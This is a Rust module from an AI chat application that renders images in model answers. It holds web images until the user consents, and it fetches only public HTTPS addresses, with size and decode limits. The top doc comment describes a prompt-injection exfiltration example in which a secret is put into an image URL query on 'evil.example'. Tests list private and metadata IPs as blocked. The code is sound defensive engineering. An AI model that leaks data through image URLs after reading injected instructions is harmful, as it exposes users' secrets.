//! Images in answers: local files, and web images once the user allows
//! them for the conversation.
//!
//! - Before an answer is drawn, `prepare` rewrites its images. A local
//!   path is resolved against the conversation's working folder and gets
//!   an "open in Preview" link after it. A web image is drawn only once the
//!   user allowed web images for this conversation; until then it's a link
//!   with its alt text, and its host is listed for the consent bar.
//! - `BytesLoader` reads `file://` URIs and fetches `https://` ones. It
//!   fetches only while web images are allowed, only over HTTPS, never
//!   from this machine or its networks (checked on every address the host
//!   resolves to, so redirects and DNS rebinding are covered too), with a
//!   size cap and a timeout.
//! - `ImageLoader` decodes PNG, JPEG, GIF (the first frame) and WebP with
//!   the `image` crate, in Rust, under size limits. Nothing is shown to the
//!   model: these images are only drawn.
//!
//! A model that read a prompt injection can put data into an image URL
//! (`https://evil.example/x.png?d=<secret>`), and loading the image sends
//! it. That's why web images wait for the user, and why the consent bar
//! names the hosts and says which URLs carry a query.

use std::{
    collections::{BTreeMap, HashMap},
    io::Cursor,
    net::IpAddr,
    path::{Path, PathBuf},
    sync::{Arc, Mutex, OnceLock},
    time::Duration,
};

use eframe::egui::{
    self, ColorImage, Context,
    load::{
        Bytes, BytesLoadResult, BytesLoader as EguiBytesLoader, BytesPoll, ImageLoadResult,
        ImageLoader as EguiImageLoader, ImagePoll, LoadError, SizeHint,
    },
};

/// The largest local file read as an image.
const MAX_FILE: u64 = 32 << 20;
/// The largest web image downloaded.
const MAX_DOWNLOAD: u64 = 10 << 20;
/// How long a web image may take, redirects included.
const FETCH_TIMEOUT: Duration = Duration::from_secs(15);
/// Larger than this either way isn't decoded (and wouldn't fit a texture).
const MAX_SIDE: u32 = 8192;
/// What a decoder may allocate.
const MAX_ALLOC: u64 = 256 << 20;
/// The scheme of the link that opens a local image in the Preview stack.
pub const OPEN_SCHEME: &str = "tai-image:";

/// Whether web images load in this conversation.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Web {
    /// Not asked yet.
    Ask,
    Allowed,
    Denied,
}

struct State {
    web: Web,
    /// The web images seen while `web` is `Ask`: host → whether any of its
    /// URLs carries a query.
    hosts: BTreeMap<String, bool>,
    /// The conversation's working folder, for relative paths.
    workdir: Option<PathBuf>,
    /// Images to open in the Preview stack.
    open: Vec<PathBuf>,
}

fn state() -> &'static Mutex<State> {
    static STATE: OnceLock<Mutex<State>> = OnceLock::new();
    STATE.get_or_init(|| {
        Mutex::new(State {
            web: Web::Ask,
            hosts: BTreeMap::new(),
            workdir: None,
            open: Vec::new(),
        })
    })
}

fn lock() -> std::sync::MutexGuard<'static, State> {
    state().lock().unwrap_or_else(|e| e.into_inner())
}

pub fn web() -> Web {
    lock().web
}

/// The user answered the consent bar.
pub fn set_web(ctx: &Context, web: Web) {
    let mut s = lock();
    s.web = web;
    s.hosts.clear();
    drop(s);
    ctx.request_repaint();
}

/// A new conversation asks again.
pub fn new_conversation() {
    let mut s = lock();
    s.web = Web::Ask;
    s.hosts.clear();
}

/// The hosts waiting for the consent bar, and whether each one's URLs
/// carry a query.
pub fn pending_hosts() -> Vec<(String, bool)> {
    let s = lock();
    if s.web != Web::Ask {
        return Vec::new();
    }
    s.hosts.iter().map(|(h, q)| (h.clone(), *q)).collect()
}

pub fn set_workdir(dir: Option<&str>) {
    lock().workdir = dir.map(PathBuf::from);
}

/// Open `path` in the Preview stack, resolved as an answer's path is.
pub fn request_open(path: &str) {
    let mut s = lock();
    let resolved = resolve(path, s.workdir.as_deref());
    s.open.push(resolved);
}

pub fn take_open() -> Vec<PathBuf> {
    std::mem::take(&mut lock().open)
}

/// Install the loaders on `ctx`.
pub fn install(ctx: &Context) {
    ctx.add_bytes_loader(Arc::new(BytesLoader::default()));
    ctx.add_image_loader(Arc::new(ImageLoader::default()));
}

// --- rewriting answers ------------------------------------------------------

/// `text` with its images made ready to draw (see the module docs).
/// Answers without images come back as they are.
pub fn prepare(text: &str) -> std::borrow::Cow<'_, str> {
    if !text.contains("![") {
        return text.into();
    }
    let (web, workdir) = {
        let s = lock();
        (s.web, s.workdir.clone())
    };
    let mut hosts = Vec::new();
    let out = rewrite(text, web, workdir.as_deref(), &mut hosts);
    if web == Web::Ask && !hosts.is_empty() {
        let mut s = lock();
        for (host, query) in hosts {
            *s.hosts.entry(host).or_default() |= query;
        }
    }
    out.into()
}

fn rewrite(
    text: &str,
    web: Web,
    workdir: Option<&Path>,
    hosts: &mut Vec<(String, bool)>,
) -> String {
    use pulldown_cmark::{Event, Parser, Tag, TagEnd};
    let mut out = String::with_capacity(text.len() + 64);
    let mut copied = 0;
    let mut links = 0usize;
    let mut image: Option<(std::ops::Range<usize>, String, String)> = None;
    for (event, range) in Parser::new_ext(text, crate::chat::markdown_options()).into_offset_iter()
    {
        match event {
            Event::Start(Tag::Link { .. }) => links += 1,
            Event::End(TagEnd::Link) => links = links.saturating_sub(1),
            Event::Start(Tag::Image { dest_url, .. }) if image.is_none() => {
                image = Some((range, dest_url.to_string(), String::new()));
            }
            Event::Text(t) | Event::Code(t) => {
                if let Some((_, _, alt)) = &mut image {
                    alt.push_str(&t);
                }
            }
            Event::End(TagEnd::Image) => {
                let Some((range, dest, alt)) = image.take() else {
                    continue;
                };
                if range.start < copied {
                    continue;
                }
                out.push_str(&text[copied..range.start]);
                out.push_str(&replacement(&dest, &alt, links > 0, web, workdir, hosts));
                copied = range.end;
            }
            _ => {}
        }
    }
    out.push_str(&text[copied..]);
    out
}

/// What an image `![alt](dest)` becomes.
fn replacement(
    dest: &str,
    alt: &str,
    in_link: bool,
    web: Web,
    workdir: Option<&Path>,
    hosts: &mut Vec<(String, bool)>,
) -> String {
    let label = if alt.trim().is_empty() {
        "image".to_string()
    } else {
        format!("image: {}", escape(alt.trim()))
    };
    let lower = dest.to_ascii_lowercase();
    if lower.starts_with("https://") || lower.starts_with("http://") {
        let parsed = url::Url::parse(dest).ok();
        // One that would never load (plain HTTP, this machine, a private
        // network) isn't offered on the consent bar either.
        if let Some(url) = parsed.as_ref().filter(|u| web_url_allowed(u).is_ok()) {
            if web == Web::Allowed {
                return format!("![{}](<{dest}>)", escape(alt));
            }
            if web == Web::Ask
                && let Some(host) = url.host_str()
            {
                hosts.push((host.to_string(), url.query().is_some()));
            }
        }
        // A link can't hold a link, so inside one the image is just text.
        return if in_link || dest.contains(['<', '>', '\n']) {
            format!("*{label}*")
        } else {
            format!("[{label}](<{dest}>)")
        };
    }
    if lower.starts_with("data:") || (dest.contains("://") && !lower.starts_with("file://")) {
        return format!("*{label}*");
    }
    let path = resolve(dest.strip_prefix("file://").unwrap_or(dest), workdir);
    let shown = path.to_string_lossy();
    if shown.contains(['<', '>', '\n']) {
        return format!("*{label}*");
    }
    let uri = file_uri(&path);
    if in_link {
        format!("![{}](<{uri}>)", escape(alt))
    } else {
        format!(
            "![{}](<{uri}>) [open in Preview](<{OPEN_SCHEME}{shown}>)",
            escape(alt)
        )
    }
}

/// `path` as an answer means it: `~` is the home folder, and a relative
/// path is inside the working folder.
fn resolve(path: &str, workdir: Option<&Path>) -> PathBuf {
    let home = || std::env::var_os("HOME").or_else(|| std::env::var_os("USERPROFILE"));
    let path = match path.strip_prefix("~/").or_else(|| path.strip_prefix("~\\")) {
        Some(rest) => match home() {
            Some(home) => PathBuf::from(home).join(rest),
            None => PathBuf::from(path),
        },
        None => PathBuf::from(path),
    };
    match workdir {
        Some(dir) if path.is_relative() => dir.join(path),
        _ => path,
    }
}

/// The URI the loaders take for a local path. It isn't percent-encoded:
/// only these loaders read it back.
fn file_uri(path: &Path) -> String {
    let p = path.to_string_lossy().replace('\\', "/");
    if p.starts_with('/') {
        format!("file://{p}")
    } else {
        format!("file:///{p}")
    }
}

/// The path in a URI from `file_uri`.
fn uri_path(uri: &str) -> Option<PathBuf> {
    let rest = uri.strip_prefix("file://")?;
    // file:///C:/x on Windows.
    let rest = match rest.as_bytes() {
        [b'/', _, b':', ..] if cfg!(windows) => &rest[1..],
        _ => rest,
    };
    Some(PathBuf::from(rest))
}

/// The URI without the frame egui adds to a GIF or WebP one: its Image
/// asks for `{uri}#{frame}` (egui 0.36.2, widgets/image.rs,
/// `encode_animated_image_uri`), as egui_extras' loaders expect. These
/// loaders draw the first frame, and egui asks only for frame 0 without
/// the frame timings they don't store.
fn source_uri(uri: &str) -> &str {
    match egui::decode_animated_image_uri(uri) {
        Ok((base, _)) if is_animated(base) => base,
        _ => uri,
    }
}

fn is_animated(uri: &str) -> bool {
    let lower = uri.to_ascii_lowercase();
    lower.ends_with(".gif") || lower.ends_with(".webp")
}

fn escape(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        if "\\`*_[](){}<>#+-!|".contains(c) {
            out.push('\\');
        }
        out.push(c);
    }
    out
}

// --- web URLs ---------------------------------------------------------------

/// Whether a web image may be fetched from `url`, before any DNS lookup.
fn web_url_allowed(url: &url::Url) -> Result<(), String> {
    if url.scheme() != "https" {
        return Err("only HTTPS images load".into());
    }
    if !url.username().is_empty() || url.password().is_some() {
        return Err("a URL with a user name or password doesn't load".into());
    }
    match url.host() {
        Some(url::Host::Domain(d)) => {
            let d = d.trim_end_matches('.').to_ascii_lowercase();
            if d == "localhost" || d.ends_with(".localhost") || d.ends_with(".local") {
                return Err(format!("{d} is this machine or its network"));
            }
            Ok(())
        }
        Some(url::Host::Ipv4(ip)) => public(IpAddr::V4(ip)),
        Some(url::Host::Ipv6(ip)) => public(IpAddr::V6(ip)),
        None => Err("no host".into()),
    }
}

/// Whether `ip` is on the public internet, not this machine or a private,
/// link-local, shared or reserved network.
fn public(ip: IpAddr) -> Result<(), String> {
    let local = match ip {
        IpAddr::V4(v4) => {
            let [a, b, ..] = v4.octets();
            v4.is_loopback()
                || v4.is_private()
                || v4.is_link_local()
                || v4.is_unspecified()
                || v4.is_broadcast()
                || v4.is_multicast()
                || v4.is_documentation()
                || a == 0
                || (a == 100 && (64..128).contains(&b)) // shared, RFC 6598
                || (a == 198 && (b == 18 || b == 19)) // benchmarking
                || a >= 240
        }
        IpAddr::V6(v6) => {
            if let Some(v4) = v6.to_ipv4_mapped() {
                return public(IpAddr::V4(v4));
            }
            let first = v6.segments()[0];
            v6.is_loopback()
                || v6.is_unspecified()
                || v6.is_multicast()
                || (first & 0xfe00) == 0xfc00 // unique local
                || (first & 0xffc0) == 0xfe80 // link-local
                || first == 0x2001 && v6.segments()[1] == 0x0db8 // documentation
        }
    };
    if local {
        Err(format!("{ip} is this machine or a private network"))
    } else {
        Ok(())
    }
}

/// ureq's resolver, refusing a host that resolves to a local address. With
/// a proxy, the proxy resolves the image's host and this resolves only the
/// proxy, which may well be on a private network, so it's let through.
#[derive(Debug, Default)]
struct PublicOnly(ureq::unversioned::resolver::DefaultResolver);

impl ureq::unversioned::resolver::Resolver for PublicOnly {
    fn resolve(
        &self,
        uri: &ureq::http::Uri,
        config: &ureq::config::Config,
        timeout: ureq::unversioned::transport::NextTimeout,
    ) -> Result<ureq::unversioned::resolver::ResolvedSocketAddrs, ureq::Error> {
        let addrs = self.0.resolve(uri, config, timeout)?;
        if config.proxy().is_none()
            && let Some(Err(why)) = addrs.iter().map(|a| public(a.ip())).find(Result::is_err)
        {
            return Err(ureq::Error::Io(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                why,
            )));
        }
        Ok(addrs)
    }
}

fn agent() -> &'static ureq::Agent {
    static AGENT: OnceLock<ureq::Agent> = OnceLock::new();
    AGENT.get_or_init(|| {
        let config = ureq::Agent::config_builder()
            .https_only(true)
            .timeout_global(Some(FETCH_TIMEOUT))
            .max_redirects(5)
            .user_agent("tai")
            .tls_config(
                ureq::tls::TlsConfig::builder()
                    .root_certs(ureq::tls::RootCerts::PlatformVerifier)
                    .build(),
            )
            .build();
        ureq::Agent::with_parts(
            config,
            ureq::unversioned::transport::DefaultConnector::new(),
            PublicOnly::default(),
        )
    })
}

fn fetch(uri: &str) -> Result<Vec<u8>, String> {
    let url = url::Url::parse(uri).map_err(|e| e.to_string())?;
    web_url_allowed(&url)?;
    let mut response = agent()
        .get(uri)
        .header("Accept", "image/png,image/jpeg,image/gif,image/webp")
        .call()
        .map_err(|e| e.to_string())?;
    let kind = response
        .headers()
        .get("content-type")
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_ascii_lowercase();
    if !kind.starts_with("image/") {
        return Err(format!("not an image ({kind})"));
    }
    response
        .body_mut()
        .with_config()
        .limit(MAX_DOWNLOAD)
        .read_to_vec()
        .map_err(|e| e.to_string())
}

fn read_file(path: &Path) -> Result<Vec<u8>, String> {
    let meta = std::fs::metadata(path).map_err(|e| e.to_string())?;
    if !meta.is_file() {
        return Err("not a file".into());
    }
    if meta.len() > MAX_FILE {
        return Err(format!("larger than {} MB", MAX_FILE >> 20));
    }
    std::fs::read(path).map_err(|e| e.to_string())
}

// --- loaders ----------------------------------------------------------------

#[derive(Clone)]
enum Slot<T> {
    Pending,
    Ready(T),
    Failed(String),
}

type Cache<T> = Arc<Mutex<HashMap<String, Slot<T>>>>;

fn get<T: Clone>(cache: &Cache<T>, uri: &str) -> Option<Slot<T>> {
    cache
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .get(uri)
        .cloned()
}

fn put<T>(cache: &Cache<T>, uri: &str, slot: Slot<T>) {
    cache
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .insert(uri.to_string(), slot);
}

/// Reads `file://` and fetches `https://`, off the UI thread.
#[derive(Default)]
struct BytesLoader {
    cache: Cache<Arc<[u8]>>,
}

impl EguiBytesLoader for BytesLoader {
    fn id(&self) -> &str {
        "tai::images::BytesLoader"
    }

    fn load(&self, ctx: &Context, uri: &str) -> BytesLoadResult {
        let uri = source_uri(uri);
        let web = uri.starts_with("https://") || uri.starts_with("http://");
        let path = uri_path(uri);
        if !web && path.is_none() {
            return Err(LoadError::NotSupported);
        }
        match get(&self.cache, uri) {
            Some(Slot::Ready(bytes)) => {
                return Ok(BytesPoll::Ready {
                    size: None,
                    bytes: Bytes::Shared(bytes),
                    mime: None,
                });
            }
            Some(Slot::Pending) => return Ok(BytesPoll::Pending { size: None }),
            Some(Slot::Failed(why)) => return Err(LoadError::Loading(why)),
            None => {}
        }
        if web && self::web() != Web::Allowed {
            return Err(LoadError::Loading(
                "web images aren't allowed in this conversation".into(),
            ));
        }
        put(&self.cache, uri, Slot::Pending);
        let (cache, ctx, uri) = (Arc::clone(&self.cache), ctx.clone(), uri.to_string());
        std::thread::Builder::new()
            .name("tai-image-load".into())
            .spawn(move || {
                let got = match &path {
                    Some(path) => read_file(path),
                    None => fetch(&uri),
                };
                let slot = match got {
                    Ok(bytes) => Slot::Ready(bytes.into()),
                    Err(why) => {
                        tracing::warn!("image {uri}: {why}");
                        Slot::Failed(why)
                    }
                };
                put(&cache, &uri, slot);
                ctx.request_repaint();
            })
            .map_err(|e| LoadError::Loading(e.to_string()))?;
        Ok(BytesPoll::Pending { size: None })
    }

    fn forget(&self, uri: &str) {
        self.cache
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .remove(uri);
    }

    fn forget_all(&self) {
        self.cache.lock().unwrap_or_else(|e| e.into_inner()).clear();
    }

    fn byte_size(&self) -> usize {
        self.cache
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .values()
            .map(|s| match s {
                Slot::Ready(b) => b.len(),
                _ => 0,
            })
            .sum()
    }

    fn has_pending(&self) -> bool {
        self.cache
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .values()
            .any(|s| matches!(s, Slot::Pending))
    }
}

/// Decodes what `BytesLoader` got, off the UI thread.
#[derive(Default)]
struct ImageLoader {
    cache: Cache<Arc<ColorImage>>,
}

impl EguiImageLoader for ImageLoader {
    fn id(&self) -> &str {
        "tai::images::ImageLoader"
    }

    fn load(&self, ctx: &Context, uri: &str, _size_hint: SizeHint) -> ImageLoadResult {
        let uri = source_uri(uri);
        if !(uri.starts_with("file://")
            || uri.starts_with("https://")
            || uri.starts_with("http://"))
        {
            return Err(LoadError::NotSupported);
        }
        match get(&self.cache, uri) {
            Some(Slot::Ready(image)) => return Ok(ImagePoll::Ready { image }),
            Some(Slot::Pending) => return Ok(ImagePoll::Pending { size: None }),
            Some(Slot::Failed(why)) => return Err(LoadError::Loading(why)),
            None => {}
        }
        let bytes = match ctx.try_load_bytes(uri)? {
            BytesPoll::Ready { bytes, .. } => bytes,
            BytesPoll::Pending { size } => return Ok(ImagePoll::Pending { size }),
        };
        put(&self.cache, uri, Slot::Pending);
        let (cache, ctx, uri) = (Arc::clone(&self.cache), ctx.clone(), uri.to_string());
        let bytes: Arc<[u8]> = match bytes {
            Bytes::Static(b) => b.into(),
            Bytes::Shared(b) => b,
        };
        std::thread::Builder::new()
            .name("tai-image-decode".into())
            .spawn(move || {
                let slot = match decode(&bytes) {
                    Ok(image) => Slot::Ready(Arc::new(image)),
                    Err(why) => {
                        tracing::warn!("image {uri}: {why}");
                        Slot::Failed(why)
                    }
                };
                put(&cache, &uri, slot);
                ctx.request_repaint();
            })
            .map_err(|e| LoadError::Loading(e.to_string()))?;
        Ok(ImagePoll::Pending { size: None })
    }

    fn forget(&self, uri: &str) {
        self.cache
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .remove(uri);
    }

    fn forget_all(&self) {
        self.cache.lock().unwrap_or_else(|e| e.into_inner()).clear();
    }

    fn byte_size(&self) -> usize {
        self.cache
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .values()
            .map(|s| match s {
                Slot::Ready(i) => i.pixels.len() * 4,
                _ => 0,
            })
            .sum()
    }

    fn has_pending(&self) -> bool {
        self.cache
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .values()
            .any(|s| matches!(s, Slot::Pending))
    }
}

/// Decode PNG, JPEG, GIF or WebP, whichever the bytes are, under limits.
fn decode(bytes: &[u8]) -> Result<ColorImage, String> {
    let mut reader = image::ImageReader::new(Cursor::new(bytes))
        .with_guessed_format()
        .map_err(|e| e.to_string())?;
    let mut limits = image::Limits::default();
    limits.max_image_width = Some(MAX_SIDE);
    limits.max_image_height = Some(MAX_SIDE);
    limits.max_alloc = Some(MAX_ALLOC);
    reader.limits(limits);
    let image = reader.decode().map_err(|e| e.to_string())?.to_rgba8();
    let size = [image.width() as usize, image.height() as usize];
    Ok(ColorImage::from_rgba_unmultiplied(size, image.as_raw()))
}

/// An image in the Preview stack: the file, fitted to the pane.
pub fn show_file(ui: &mut egui::Ui, path: &Path) {
    let shown = path.to_string_lossy();
    // A cut-off label shows the whole text on hover by itself.
    ui.add(egui::Label::new(egui::RichText::new(shown.as_ref()).weak()).truncate());
    egui::ScrollArea::both()
        .auto_shrink([false, false])
        .show(ui, |ui| {
            ui.add(
                egui::Image::from_uri(file_uri(path))
                    .max_size(ui.available_size())
                    .fit_to_original_size(1.0)
                    .show_loading_spinner(true),
            );
        });
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(text: &str, web: Web) -> (String, Vec<(String, bool)>) {
        let mut hosts = Vec::new();
        let out = rewrite(text, web, Some(Path::new("/work")), &mut hosts);
        (out, hosts)
    }

    #[test]
    fn a_web_image_waits_for_the_user() {
        let (out, hosts) = run(
            "See ![a cat](https://img.example/c.png?x=1) here.",
            Web::Ask,
        );
        assert_eq!(
            out,
            "See [image: a cat](<https://img.example/c.png?x=1>) here."
        );
        assert_eq!(hosts, vec![("img.example".to_string(), true)]);
        let (out, hosts) = run("![a cat](https://img.example/c.png)", Web::Denied);
        assert_eq!(out, "[image: a cat](<https://img.example/c.png>)");
        assert!(hosts.is_empty());
        let (out, _) = run("![a cat](https://img.example/c.png)", Web::Allowed);
        assert_eq!(out, "![a cat](<https://img.example/c.png>)");
    }

    #[test]
    fn allowed_still_refuses_local_and_plain_http() {
        for url in [
            "http://img.example/c.png",
            "https://127.0.0.1/c.png",
            "https://10.1.2.3/c.png",
            "https://[::1]/c.png",
            "https://localhost:8080/c.png",
            "https://user:pw@img.example/c.png",
        ] {
            let (out, _) = run(&format!("![x]({url})"), Web::Allowed);
            assert!(out.starts_with("[image: x]"), "{url}: {out}");
            let (_, hosts) = run(&format!("![x]({url})"), Web::Ask);
            assert!(hosts.is_empty(), "{url} is offered: {hosts:?}");
        }
    }

    #[test]
    fn a_badge_inside_a_link_stays_text() {
        let (out, _) = run(
            "[![build](https://ci.example/b.svg)](https://ci.example)",
            Web::Ask,
        );
        assert_eq!(out, "[*image: build*](https://ci.example)");
    }

    #[test]
    fn a_local_path_is_in_the_working_folder_and_opens_in_preview() {
        let (out, hosts) = run("![plot](out/plot.png)", Web::Ask);
        assert_eq!(
            out,
            "![plot](<file:///work/out/plot.png>) [open in Preview](<tai-image:/work/out/plot.png>)"
        );
        assert!(hosts.is_empty());
        // A path with a space is written in <…>, or it isn't an image.
        let (out, _) = run("![](</tmp/a b.png>)", Web::Ask);
        assert!(out.contains("<file:///tmp/a b.png>"), "{out}");
        let (out, _) = run("![x](data:image/png;base64,AAAA)", Web::Allowed);
        assert_eq!(out, "*image: x*");
    }

    #[test]
    fn text_without_images_is_untouched() {
        let text = "Use `![x](y)` in code, or [a link](https://e.example).";
        assert_eq!(prepare(text), text);
        let (out, _) = run("```\n![x](https://e.example/a.png)\n```", Web::Ask);
        assert_eq!(out, "```\n![x](https://e.example/a.png)\n```");
    }

    #[test]
    fn public_addresses_only() {
        for ip in [
            "127.0.0.1",
            "192.168.1.5",
            "169.254.169.254",
            "100.64.0.1",
            "::1",
            "fd00::1",
            "::ffff:10.0.0.1",
        ] {
            assert!(public(ip.parse().unwrap()).is_err(), "{ip}");
        }
        for ip in ["93.184.215.14", "2606:4700::6810:84e5"] {
            assert!(public(ip.parse().unwrap()).is_ok(), "{ip}");
        }
    }

    /// egui asks for a GIF or WebP as `{uri}#{frame}` (popos-tai's test).
    #[test]
    fn a_frame_suffix_is_dropped_for_gif_and_webp() {
        assert_eq!(source_uri("file:///a/pic.webp#0"), "file:///a/pic.webp");
        assert_eq!(
            source_uri("https://e.example/anim.GIF#3"),
            "https://e.example/anim.GIF"
        );
        assert_eq!(source_uri("file:///a/plot.png"), "file:///a/plot.png");
        assert_eq!(
            source_uri("https://e.example/a.png#0"),
            "https://e.example/a.png#0"
        );
    }

    #[test]
    fn gif_and_webp_decode() {
        let pixel = image::RgbaImage::from_pixel(2, 1, image::Rgba([9, 8, 7, 255]));
        for format in [image::ImageFormat::Gif, image::ImageFormat::WebP] {
            let mut bytes = Vec::new();
            image::DynamicImage::ImageRgba8(pixel.clone())
                .write_to(&mut Cursor::new(&mut bytes), format)
                .unwrap();
            assert_eq!(decode(&bytes).unwrap().size, [2, 1], "{format:?}");
        }
    }

    #[test]
    fn decoding_has_limits() {
        // A PNG header claiming 100000 x 100000 pixels.
        let mut png = Vec::new();
        png.extend_from_slice(b"\x89PNG\r\n\x1a\n\0\0\0\x0dIHDR");
        png.extend_from_slice(&100_000u32.to_be_bytes());
        png.extend_from_slice(&100_000u32.to_be_bytes());
        png.extend_from_slice(&[8, 6, 0, 0, 0, 0, 0, 0, 0]);
        assert!(decode(&png).is_err());
        assert!(decode(b"not an image").is_err());
        // A real 1x1 PNG decodes.
        let mut ok = Vec::new();
        image::RgbaImage::from_pixel(1, 1, image::Rgba([1, 2, 3, 255]))
            .write_to(&mut Cursor::new(&mut ok), image::ImageFormat::Png)
            .unwrap();
        assert_eq!(decode(&ok).unwrap().size, [1, 1]);
    }
}
